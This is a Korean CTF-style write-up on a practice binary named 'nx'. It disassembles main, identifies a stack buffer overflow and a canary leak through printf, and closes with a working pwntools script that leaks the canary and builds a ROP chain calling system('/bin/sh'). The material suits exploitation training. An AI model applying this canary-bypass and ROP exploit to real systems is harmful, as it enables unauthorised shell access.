# NX 분석

## 어셈블리 분석

---

### main

```asm
0x4006fb <main+4>     sub    rsp, 0x40
```

- 스택 프레임 확보를 위해 `rsp` 레지스터를 `0x40`만큼 감소, 스택에 `64바이트(0x40)` 공간 확보

```asm
0x4006ff <main+8>     mov    rax, qword ptr fs:[0x28]            RAX, [0x7ffff7daf768] => 0x49bec9d436e7b800
0x400708 <main+17>    mov    qword ptr [rbp - 8], rax            [0x7fffffffdd58] <= 0x49bec9d436e7b800
0x40070c <main+21>    xor    eax, eax
```

- Canary 설계 → `[rbp - 8]` 위치에 Canary 값 저장
- 후에 하위 32비트 레지스터(`eax`)를 `xor` 명령어로 초기화 → 관례적으로 `main()`의 반환값을 0으로 만드는 코드

```asm
0x40070e <main+23>    mov    rax, qword ptr [rip + 0x20095b]     RAX, [stdin@@GLIBC_2.2.5] => 0x7ffff7f998e0 (_IO_2_1_stdin_) ◂— 0xfbad2088                                                                            
0x400715 <main+30>    mov    ecx, 0                             
0x40071a <main+35>    mov    edx, 2                              
0x40071f <main+40>    mov    esi, 0                              
0x400724 <main+45>    mov    rdi, rax 
```

- `rip` 레지스터의 값: `0x400715`
- ELF GOT의 stdin 항목에 접근하여 **실제 libc의 _IO_2_1_stdin_ 주소를 `rax`에 로드**함
- 각각 함수 인자 `ecx` = `0` → 함수의 네 번째 인자
- `edx` = `2` → 함수의 세 번째 인자
- `esi` = `0` → 함수의 두 번째 인자
- `rdi` 레지스터에 `rax`의 값 **0x7ffff7f998e0 (_IO_2_1_stdin_)** 을 전달. → 함수의 첫 번째 인자

```asm
0x400727 <main+48>    call   setvbuf@plt 
```

- `setvbuf` 함수 호출
> 최종: **setvbuf(0x7ffff7f998e0 (_IO_2_1_stdin_), 0, 2, 0);**

```asm
0x40072c <main+53>    mov    rax, qword ptr [rip + 0x20092d]     RAX, [stdout@@GLIBC_2.2.5] => 0x7ffff7f9a5c0 (_IO_2_1_stdout_) ◂— 0xfbad2084                                                                          
0x400733 <main+60>    mov    ecx, 0                            
0x400738 <main+65>    mov    edx, 2                             
0x40073d <main+70>    mov    esi, 0                              
0x400742 <main+75>    mov    rdi, rax 
```

- `rip` 레지스터의 값: `0x400733`
- ELF GOT의 stdin 항목에 접근하여 **실제 libc의 _IO_2_1_stdout_ 주소를 `rax`에 로드**함

> **나머진 위와 같음.**

```asm
0x400745 <main+78>    call   setvbuf@plt
```

- `setvbuf` 함수 호출
> 최종: **setvbuf(0x7ffff7f9a5c0 (_IO_2_1_stdout_), 0, 2, 0);**

```asm
0x40074a <main+83>     mov    edi, 0x40087c     
0x40074f <main+88>     mov    eax, 0
```

- `edi` 레지스터 에게 `0x40087c` 문자열 복사
→ **0x40087c: "echo 'system@plt'"**
- mov `eax, 0`은 variadic 함수 호출 전의 관례적인 초기화 코드
→ `eax`는 **x86-64 ABI 규약상, al 값이 가변 인자 개수 조정 등**에 쓰일 수 있음

```asm
0x400754 <main+93>     call   system@plt
```

- `system` 함수 호출
> 최종: **system("echo 'system@plt'");**

```asm
0x400759 <main+98>     mov    edi, 0x40088e 
0x40075e <main+103>    call   puts@plt
```

- `edi` 레지스터에 `0x40088e` 문자열 복사
→ **0x40088e: "[1] Leak Canary"**

- 후에 `puts` 함수 호출
> 최종: **puts("[1] Leak Canary");**

```asm
0x0000000000400763 <+108>:   mov    edi,0x40089e
```

- `0x40089e` 값을 `edi` 레지스터 에게 복사
- `edi`는 첫 번째 인자


```asm
0x000000000040076d <+118>:   call   0x4005e0 <printf@plt>
```

- `printf` 함수 호출
> 최종 **printf("Buf: ");**

```asm
0x0000000000400772 <+123>:   lea    rax,[rbp-0x40]
0x0000000000400776 <+127>:   mov    edx,0x100
0x000000000040077b <+132>:   mov    rsi,rax
0x000000000040077e <+135>:   mov    edi,0x0
```

- `read` 함수 호출을 위한 준비
- `[rbp-0x40]` 연산 수행 → `0x7fffffffdd20` ← **현재 `rsp`의 값**
- 세 번째 인자 `edx` 레지스터 에게 `0x100`의 값을 복사
- 두 번째 인자 `rsi` 레지스터 에게 `0x7fffffffdd20` 의 값을 복사
- 첫 번째 인자 `edi` 레지스터 에게 `0x0`의 값을 복사

```asm
0x0000000000400783 <+140>:   call   0x4005f0 <read@plt
```

- `read` 함수 호출
> 최종 **read(0x0, 0x7fffffffdd20, 0x100);**

```asm
0x0000000000400788 <+145>:   lea    rax,[rbp-0x40]
0x000000000040078c <+149>:   mov    rsi,rax
0x000000000040078f <+152>:   mov    edi,0x4008a4
```

- `printf` 함수 호출을 위한 준비
- `[rbp-0x40]` 연산 수행 → `0x7fffffffdd20` ← **현재 `rsp`의 값**
→ 위 값을 `rax` 레지스터 에게 전달
- `rsi` 레지스터 에게 `0x7fffffffdd20` 스택 주소 값을 전달 → 두 번째 인자
- `edi` 레지스터 에게 `0x4008a4` 문자열 전달 → 첫 번째 인자

```asm
0x00000000004007b2 <+187>:   call   0x4005e0 <printf@plt>
```

- `printf` 함수 호출
> 최종: **printf("Buf: %s\n", 0x7fffffffdd20);**

```asm
0x00000000004007b7 <+192>:   lea    rax,[rbp-0x40]
0x00000000004007bb <+196>:   mov    edx,0x100
0x00000000004007c0 <+201>:   mov    rsi,rax
0x00000000004007c3 <+204>:   mov    edi,0x0
```

- `read` 함수 호출을 위한 준비
- `[rbp-0x40]` 연산 수행 → `0x7fffffffdd20` ← **현재 `rsp`의 값**
→ 위 값을 `rax` 레지스터 에게 전달
- 세 번째 인자 `edx` 레지스터 에게 `0x100`의 값을 복사
- 두 번째 인자 `rsi` 레지스터 에게 `0x7fffffffdd20` 의 값을 복사
- 첫 번째 인자 `edi` 레지스터 에게 `0x0`의 값을 복사

```asm
0x00000000004007c8 <+209>:   call   0x4005f0 <read@plt>
```

- `read` 함수 호출
> 최종: **read(0x0, 0x7fffffffdd20, 0x100);**

```asm
0x00000000004007d2 <+219>:   mov    rcx,QWORD PTR [rbp-0x8]
0x00000000004007d6 <+223>:   xor    rcx,QWORD PTR fs:0x28
0x00000000004007df <+232>:   je     0x4007e6 <main+239>
0x00000000004007e1 <+234>:   call   0x4005c0 <__stack_chk_fail@plt>
```

- **Canary 값 비교 과정**
- 함수 시작 전 Canary 값이 저장 된 `[rbp-0x8]` 주소 안의 값을 `rcx` 레지스터 에게 복사
- 두 값이 같으면 → `xor` 결과 0 → **ZF 플래그 레지스터 켜짐** 
→ 정상 종료 루틴 **`0x00000000004007e6 <+239>` 주소로 점프**
- 두 값이 다르면 →  **ZF 플래그 레지스터 꺼짐** 점프 하지 않고 `__stack_chk_fail` 함수 호출 

```asm
0x00000000004007e6 <+239>:   leave
0x00000000004007e7 <+240>:   ret
```

- `leave` 명령어로 스택 프레임을 정리하고, `ret` 명령어로 호출자에게 복귀.

---

#### main 최종 c언어 

```c
int main() {
    char buf[0x40]; // 0x7fffffffdd20 == buf

    setvbuf(0x7ffff7f998e0 (_IO_2_1_stdin_), 0, 2, 0);
    setvbuf(0x7ffff7f9a5c0 (_IO_2_1_stdout_), 0, 2, 0);

    system("echo 'system@plt'");

    puts("[1] Leak Canary");
    printf("Buf: ");
    read(0x0, buf, 0x100);
    printf("Buf: %s\n", buf);

    printf("[2] Overwrite return address\n");
    printf("Buf: ");
    read(0x0, buf, 0x100);
}
```

---

## 결론

### 구조 분석

- 스택 주소 `0x7fffffffdd20`, `[rbp - 8]` 주소 위치에 Canary 값 저장
- `0x7fffffffdd20` 주소 값이 약 Canary 저장 주소와 **`56`바이트 offset 차이가 남**
- `read` 함수엔 총 `0x100` 바이트까지 입력이 가능 함.
- `printf("Buf: %s\n", buf);` 출력 함수로 **Canary 값 유출 가능**

---

### 분석 환경


- **RELRO**        →  Partial RELRO  → GOT 보호 일부만 적용
- **STACK CANARY** →  Canary found   → 스택 카나리 있음 (버퍼 오버플로우 탐지 가능)
- **NX**           →  NX enabled     → 스택 **실행 불가** → 쉘코드 직접 실행 차단  
- **PIE**          →  No PIE        

---

### 익스플로잇 포인트

- 현재 쉘 코드는 직접 실행이 차단 되어, **ROP 체인을 구성하여 우회**를 시도
- 다음과 같은 페이로드를 구성 함:
    - `ret` (스택 정렬용, 일부 libc에서 alignment 문제 해결용)
    - `pop rdi; ret` (첫 번째 인자를 설정하기 위한 가젯)
    - `/bin/sh` 문자열의 주소
    - `system@plt` 주소

> 이 ROP 체인은 결국 `system("/bin/sh")`를 호출하게 되어 쉘을 획득할 수 있으며, 이는 **실행 권한이 없는 스택(NX)이 설정된 환경에서의 우회 기법**이다.

---

### 파이썬 페이로드

```python
from pwn import *

p = process("./nx")
context.log_level = 'debug'

padding = b'A' * 57

p.sendafter(b'Buf: ', padding)
p.recvuntil(padding)
canary = u64(b'\x00' + p.recvn(7))

payload = b'A' * 56
payload += p64(canary)
payload += b'B' * 8

payload += p64(0x400596)  # ret
payload += p64(0x400853)  # pop rdi; ret
payload += p64(0x400874)  # "/bin/sh" 주소
payload += p64(0x4005d0)  # system@plt

p.sendafter(b'Buf: ', payload)

p.interactive()
```